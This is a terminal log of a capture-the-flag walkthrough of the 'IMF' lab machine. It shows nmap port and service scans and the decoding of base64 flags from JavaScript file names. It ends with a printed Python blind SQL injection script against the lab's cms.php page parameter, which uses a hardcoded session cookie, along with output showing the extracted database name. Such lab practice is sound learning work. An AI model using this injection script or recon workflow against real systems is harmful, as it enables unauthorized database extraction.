Scanned at 2023-08-10 07:08:11 BST for 105s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:31:A6:8B (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 104.51 seconds
           Raw packets sent: 131153 (5.771MB) | Rcvd: 215 (22.574KB)
                                                                   
user@jakin:~/Documents/imf$ sudo nmap -F -sU -n -Pn -vvv 192.168.0.111 -oG top100udpports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 07:11 BST
Initiating ARP Ping Scan at 07:11
Scanning 192.168.0.111 [1 port]
Completed ARP Ping Scan at 07:11, 0.05s elapsed (1 total hosts)
Initiating UDP Scan at 07:11
Scanning 192.168.0.111 [100 ports]
Completed UDP Scan at 07:11, 3.15s elapsed (100 total ports)
Nmap scan report for 192.168.0.111
Host is up, received arp-response (0.00030s latency).
Scanned at 2023-08-10 07:11:35 BST for 3s

PORT      STATE         SERVICE         REASON
7/udp     open|filtered echo            no-response
9/udp     open|filtered discard         no-response
17/udp    open|filtered qotd            no-response
19/udp    open|filtered chargen         no-response
49/udp    open|filtered tacacs          no-response
53/udp    open|filtered domain          no-response
67/udp    open|filtered dhcps           no-response
68/udp    open|filtered dhcpc           no-response
69/udp    open|filtered tftp            no-response
80/udp    open|filtered http            no-response
88/udp    open|filtered kerberos-sec    no-response
111/udp   open|filtered rpcbind         no-response
120/udp   open|filtered cfdptkt         no-response
123/udp   open|filtered ntp             no-response
135/udp   open|filtered msrpc           no-response
136/udp   open|filtered profile         no-response
137/udp   open|filtered netbios-ns      no-response
138/udp   open|filtered netbios-dgm     no-response
139/udp   open|filtered netbios-ssn     no-response
158/udp   open|filtered pcmail-srv      no-response
161/udp   open|filtered snmp            no-response
162/udp   open|filtered snmptrap        no-response
177/udp   open|filtered xdmcp           no-response
427/udp   open|filtered svrloc          no-response
443/udp   open|filtered https           no-response
445/udp   open|filtered microsoft-ds    no-response
497/udp   open|filtered retrospect      no-response
500/udp   open|filtered isakmp          no-response
514/udp   open|filtered syslog          no-response
515/udp   open|filtered printer         no-response
518/udp   open|filtered ntalk           no-response
520/udp   open|filtered route           no-response
593/udp   open|filtered http-rpc-epmap  no-response
623/udp   open|filtered asf-rmcp        no-response
626/udp   open|filtered serialnumberd   no-response
631/udp   open|filtered ipp             no-response
996/udp   open|filtered vsinet          no-response
997/udp   open|filtered maitrd          no-response
998/udp   open|filtered puparp          no-response
999/udp   open|filtered applix          no-response
1022/udp  open|filtered exp2            no-response
1023/udp  open|filtered unknown         no-response
1025/udp  open|filtered blackjack       no-response
1026/udp  open|filtered win-rpc         no-response
1027/udp  open|filtered unknown         no-response
1028/udp  open|filtered ms-lsa          no-response
1029/udp  open|filtered solid-mux       no-response
1030/udp  open|filtered iad1            no-response
1433/udp  open|filtered ms-sql-s        no-response
1434/udp  open|filtered ms-sql-m        no-response
1645/udp  open|filtered radius          no-response
1646/udp  open|filtered radacct         no-response
1701/udp  open|filtered L2TP            no-response
1718/udp  open|filtered h225gatedisc    no-response
1719/udp  open|filtered h323gatestat    no-response
1812/udp  open|filtered radius          no-response
1813/udp  open|filtered radacct         no-response
1900/udp  open|filtered upnp            no-response
2000/udp  open|filtered cisco-sccp      no-response
2048/udp  open|filtered dls-monitor     no-response
2049/udp  open|filtered nfs             no-response
2222/udp  open|filtered msantipiracy    no-response
2223/udp  open|filtered rockwell-csp2   no-response
3283/udp  open|filtered netassistant    no-response
3456/udp  open|filtered IISrpc-or-vat   no-response
3703/udp  open|filtered adobeserver-3   no-response
4444/udp  open|filtered krb524          no-response
4500/udp  open|filtered nat-t-ike       no-response
5000/udp  open|filtered upnp            no-response
5060/udp  open|filtered sip             no-response
5353/udp  open|filtered zeroconf        no-response
5632/udp  open|filtered pcanywherestat  no-response
9200/udp  open|filtered wap-wsp         no-response
10000/udp open|filtered ndmp            no-response
17185/udp open|filtered wdbrpc          no-response
20031/udp open|filtered bakbonenetvault no-response
30718/udp open|filtered unknown         no-response
31337/udp open|filtered BackOrifice     no-response
32768/udp open|filtered omad            no-response
32769/udp open|filtered filenet-rpc     no-response
32771/udp open|filtered sometimes-rpc6  no-response
32815/udp open|filtered unknown         no-response
33281/udp open|filtered unknown         no-response
49152/udp open|filtered unknown         no-response
49153/udp open|filtered unknown         no-response
49154/udp open|filtered unknown         no-response
49156/udp open|filtered unknown         no-response
49181/udp open|filtered unknown         no-response
49182/udp open|filtered unknown         no-response
49185/udp open|filtered unknown         no-response
49186/udp open|filtered unknown         no-response
49188/udp open|filtered unknown         no-response
49190/udp open|filtered unknown         no-response
49191/udp open|filtered unknown         no-response
49192/udp open|filtered unknown         no-response
49193/udp open|filtered unknown         no-response
49194/udp open|filtered unknown         no-response
49200/udp open|filtered unknown         no-response
49201/udp open|filtered unknown         no-response
65024/udp open|filtered unknown         no-response
MAC Address: 00:0C:29:31:A6:8B (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.36 seconds
           Raw packets sent: 257 (15.752KB) | Rcvd: 1 (28B)
                                                                                                                                       
user@jakin:~/Documents/imf$ ls                             
allPorts  content  exploits  nmap  scripts  top100udpports
                                                                                                                                       
user@jakin:~/Documents/imf$ mv allPorts nmap      
                                                                                                                                       
user@jakin:~/Documents/imf$ ls
content  exploits  nmap  scripts  top100udpports
                                                                                                                                       
user@jakin:~/Documents/imf$ mv top100udpports nmap 
                                                                                                                                       
user@jakin:~/Documents/imf$ extractPorts nmap/allPorts 

[*] Extracting information...

	[*] IP Address: 192.168.0.111
	[*] Open ports: 80

[*] Ports copied to clipboard

                                                                                                                                       
user@jakin:~/Documents/imf$ nmap -sCV -n -vv -p80 192.168.0.111 -oN nmap/targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 07:16 BST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:16
Completed NSE at 07:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:16
Completed NSE at 07:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:16
Completed NSE at 07:16, 0.00s elapsed
Initiating Ping Scan at 07:16
Scanning 192.168.0.111 [2 ports]
Completed Ping Scan at 07:16, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 07:16
Scanning 192.168.0.111 [1 port]
Discovered open port 80/tcp on 192.168.0.111
Completed Connect Scan at 07:16, 0.00s elapsed (1 total ports)
Initiating Service scan at 07:16
Scanning 1 service on 192.168.0.111
Completed Service scan at 07:16, 6.04s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.0.111.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:16
Completed NSE at 07:16, 5.02s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:16
Completed NSE at 07:16, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:16
Completed NSE at 07:16, 0.00s elapsed
Nmap scan report for 192.168.0.111
Host is up, received syn-ack (0.00070s latency).
Scanned at 2023-08-10 07:16:45 BST for 11s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: IMF - Homepage
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:16
Completed NSE at 07:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:16
Completed NSE at 07:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:16
Completed NSE at 07:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds
                                                                                                                                       
user@jakin:~/Documents/imf$ ip a 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:3e:5b:f8 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.106/24 brd 192.168.0.255 scope global dynamic noprefixroute eth0
       valid_lft 82615sec preferred_lft 82615sec
    inet6 fe80::20c:29ff:fe3e:5bf8/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:bb:4b:18:4f brd ff:ff:ff:ff:ff:ff
                                                                                                                                       
user@jakin:~/Documents/imf$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
^C
Keyboard interrupt received, exiting.
                                                                                                                                       
user@jakin:~/Documents/imf$ echo -n 'ZmxhZzJ7YVcxbVl' | base64 -d
flag2{aW1mYbase64: invalid input
                                                                                                                                       
user@jakin:~/Documents/imf$ echo -n 'ZmxhZzJ7YVcxbVl' | base64 -d ; echo
flag2{aW1mYbase64: invalid input

                                                                                                                                       
user@jakin:~/Documents/imf$ echo -n 'XUnRhVzVwYzNS' | base64 -d         
]Iх\����base64: invalid input
                                                                                                                                       
user@jakin:~/Documents/imf$ echo -n 'eVlYUnZjZz09fQ==' | base64 -d
yYXRvcg==}                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://192.168.0.105 | less                                  
                                                                                                                                       
user@jakin:~/Documents/imf$ 
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local                                             
<!DOCTYPE html>
<html class="no-js">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>IMF - Homepage</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <!-- Place favicon.ico and apple-touch-icon.png in the root directory -->
        
        <!-- Fonts -->




        <!-- CSS -->

        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/font-awesome.min.css">
        <link rel="stylesheet" href="css/main.css">
        <link rel="stylesheet" href="css/animate.css">
        <link rel="stylesheet" href="css/responsive.css">
        

        <!-- Js -->
        <script src="js/vendor/modernizr-2.6.2.min.js"></script>
        <script src="js/vendor/jquery-1.10.2.min.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
        <script>
         new WOW(
            ).init();
        </script>

    </head>
    <body>


    <header>
        <div class="container">
            <div class="row">
                <div class="col-md-3 col-xs-6 col-sm-3">
                    <a href="#" class="logo">
                        <img src="images/logo.png" alt="">
                    </a>
                </div>
                <div class="col-md-6 col-xs-6 col-sm-6">
                    <div class="menu">
                        <nav class="navbar navbar-default" role="navigation">
                            <div class="container-fluid">
                                <!-- Brand and toggle get grouped for better mobile display -->
                                <div class="navbar-header">
                                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                                    <span class="sr-only">Toggle navigation</span>
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                                    </button>
                                </div>

                                <!-- Collect the nav links, forms, and other content for toggling -->
                                <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                                    <ul class="nav navbar-nav">
                                        <li><a href="#banner">Home</a></li>
                                        <li><a href="projects.php">Projects</a></li>
                                        <li><a href="contact.php">Contact Us</a></li>
                                    </ul>
                                  
                                </div><!-- /.navbar-collapse -->
                            </div><!-- /.container-fluid -->
                        </nav>
                    </div>
                </div>
            </div>
        </div>
    </header>

    


    <section id="banner" class="wow fadeInUp">
        <div class="container">
            <div class="row">

                <div class="col-md-4 col-sm-6">
                    <div class="block">
                        <img class="app-img img-responsive" src="images/roundlogo.png" alt="">
                    </div>
                    
                </div>
                <div class="col-md-6 col-md-offset-1 col-sm-6">
                    <div class="block">
                        <h1>
                            Impossible Mission Force
                        </h1>
                        <p>
                            An independent intelligence agency for the United States government specialising in espionage.
                        </p>

                    </div>
                </div>
            </div>
        </div>
    </section>



    <footer class="wow fadeInUp" data-wow-delay=".8s">
        <div class="container text-center">
            <div class="row">
                <div class="col-md-12">
                        <a class="footer-logo"href="#">
                            <img class="img-responsive" src="images/logo.png" alt="">
                        </a>
                    <p>Copyright © 2016 Impossible Mission Force. All rights reserved.</p>
                    
                </div>
            </div>
        </div>
    </footer>

</body>
</html>
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js
<html class="no-js">
        <script src="js/vendor/modernizr-2.6.2.min.js"></script>
        <script src="js/vendor/jquery-1.10.2.min.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP ".?*"
grep: quantifier does not follow a repeatable item
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"'
"js/ZmxhZzJ7YVcxbVl.js"
"js/XUnRhVzVwYzNS.js"
"js/eVlYUnZjZz09fQ==.min.js"
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"'
js/ZmxhZzJ7YVcxbVl.js
js/XUnRhVzVwYzNS.js
js/eVlYUnZjZz09fQ==.min.js
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///'
ZmxhZzJ7YVcxbVl.js
XUnRhVzVwYzNS.js
eVlYUnZjZz09fQ==.min.js
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="."
ZmxhZzJ7YVcxbVl
XUnRhVzVwYzNS
eVlYUnZjZz09fQ==
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="." | xargs
ZmxhZzJ7YVcxbVl XUnRhVzVwYzNS eVlYUnZjZz09fQ==
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="." | xargs | tr -d ' '
ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="." | xargs | tr -d ' ' | base64 -d
flag2{aW1mYWRtaW5pc3RyYXRvcg==}                                                                                                                                       
user@jakin:~/Documents/imf$ echo -n 'aW1mYWRtaW5pc3RyYXRvcg==' base64 -d
aW1mYWRtaW5pc3RyYXRvcg== base64 -d                                                                                                                                       
┌──(user㉿jakin)-[~/Documents/imf]
└─$ echo -n 'aW1mYWRtaW5pc3RyYXRvcg=='| base64 -d
imfadministrator                                                                                                                                       
┌──(user㉿jakin)-[~/Documents/imf]
└─$ grep -r "imfadministrator" /usr/share/seclists -n
                                                                                                                                       
┌──(user㉿jakin)-[~/Documents/imf]
└─$ echo -n 'Y29udGludWVUT2Ntcw==' | base64 -d   
continueTOcms                                                                                                                                       
┌──(user㉿jakin)-[~/Documents/imf]
└─$ cat exploits/sqli.py           
#!/usr/bin/python3

import requests, signal, sys, time, string
from pwn import *

def def_handler(sig,frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://imf.local/imfadministrator/cms.php?pagename="
#characters = string.printable
characters = string.ascii_lowercase

def makeSQLi():
    p1 = log.progress("Brute force")
    p1.status("Starting brute force process")

    time.sleep(2)

    p2 = log.progress("Extracted data")

    headers = {
        'Cookie' :  'PHPSESSID=546aibbngp354f20svq65uhop7'
    }
    extracted_info = ""

    for position in range(1,6):
        for character in characters:
            sqli_url = main_url + "home' or substring(database(),%d,1)='%s" % (position,character)

            p1.status(sqli_url)
            r = requests.get(sqli_url, headers=headers)


            if "Welcome to the IMF Administration." not in r.text:
                extracted_info += character
                p2.status(extracted_info)
                break
    
    p1.success("SQLi attack done")
    p2.success(extracted_info)


if __name__ == '__main__':
    makeSQLi()                                                                                                                                       
┌──(user㉿jakin)-[~/Documents/imf]
└─$ python3 exploits/sqli.py 
[+] Brute force: SQLi attack done
[+] Extracted data: admin
                                                                                                                                       
┌──(user㉿jakin)-[~/Documents/imf]
└─$